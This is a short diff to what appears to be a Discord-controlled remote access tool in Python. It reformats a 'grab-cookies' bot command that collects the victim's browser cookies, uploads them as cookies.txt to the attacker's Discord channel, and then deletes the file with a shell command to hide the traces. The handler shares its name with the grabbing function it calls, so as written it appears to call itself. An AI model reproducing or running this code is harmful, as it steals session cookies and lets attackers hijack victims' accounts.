@@ -137,13 +137,9 @@ class Browsers:
 import asyncio
 
 @client.command(name="grab-cookies")
-    async def grab_cookies(ctx):
-        #.log Author requested for grabbing cookies 
-        await ctx.send('```Grabbing cookies. Please wait...```')
-        #.log Sent message about beginning of grabbing cookies 
-        grab_cookies()
-        #.log Grabbed cookies 
-        await asyncio.sleep(1)
-        await ctx.send('```Grabbed cookies```', file=discord.File(f'cookies.txt', filename='cookies.txt'))
-        #.log Sent message with grabbed cookies 
-        subprocess.run(f'del cookies.txt', shell=True)
+async def grab_cookies(ctx):
+    await ctx.send('```Grabbing cookies. Please wait...```')
+    grab_cookies()
+    await asyncio.sleep(1)
+    await ctx.send('```Grabbed cookies```', file=discord.File(f'cookies.txt', filename='cookies.txt'))
+    subprocess.run(f'del cookies.txt', shell=True)
